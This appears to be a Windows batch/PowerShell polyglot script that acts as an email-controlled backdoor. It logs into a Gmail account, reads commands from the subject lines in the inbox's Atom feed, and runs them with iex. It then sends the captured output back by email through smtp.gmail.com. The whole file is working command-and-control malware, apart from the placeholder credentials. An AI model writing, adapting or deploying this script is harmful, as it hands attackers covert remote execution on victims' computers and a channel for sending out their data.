;@echo off
;Findstr -rbv ; %0 | powershell -c - 
;goto:sCode

Function Send-EMail {
    Param (
        [Parameter(`
            Mandatory=$true)]
        [String]$EmailTo,
        [Parameter(`
            Mandatory=$true)]
        [String]$Subject,
        [Parameter(`
            Mandatory=$true)]
        [String]$Body,
        [Parameter(`
            Mandatory=$true)]
        [String]$EmailFrom,
        [Parameter(`
            mandatory=$false)]
        [String]$attachment,
        [Parameter(`
            mandatory=$true)]
        [String]$Password
    )

        $SMTPServer = "smtp.gmail.com" 
        $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)
        if ($attachment -ne $null) {
            $SMTPattachment = New-Object System.Net.Mail.Attachment($attachment)
            $SMTPMessage.Attachments.Add($SMTPattachment)
        }
        $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
        $SMTPClient.EnableSsl = $true 
        $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom.Split("@")[0], $Password); 
        $SMTPClient.Send($SMTPMessage)
        Remove-Variable -Name SMTPClient
        Remove-Variable -Name Password

}

$email="gmailusername"
$mypass="gmailpass"

$subject=whoami
$webclient = new-object System.Net.WebClient
$webclient.Credentials = new-object System.Net.NetworkCredential ($email, $mypass)
[xml]$xml= $webclient.DownloadString("https://mail.google.com/mail/feed/atom")
$format= @{Expression={$_.title};Label="Title"},@{Expression={$_.author.name};Label="Author"}
$xml.feed.entry | format-table $format > C:\ProgramData\theapp\cmd.txt
$data = Get-Content C:\ProgramData\theapp\cmd.txt | Select -Index 3
$command = $data.TrimEnd('                             me                                         ')
if($command -ne $subject){
    iex $command > C:\ProgramData\theapp\salida.txt
    $salida = "stop "+ "`n"+((Get-Content C:\ProgramData\theapp\salida.txt) -join "`n")
    Send-EMail -EmailFrom ($email+"@gmail.com") -EmailTo ($email+"@gmail.com") -Body $salida -Subject $subject -Password $mypass -attachment $null;
}

;:sCode 
;goto :eof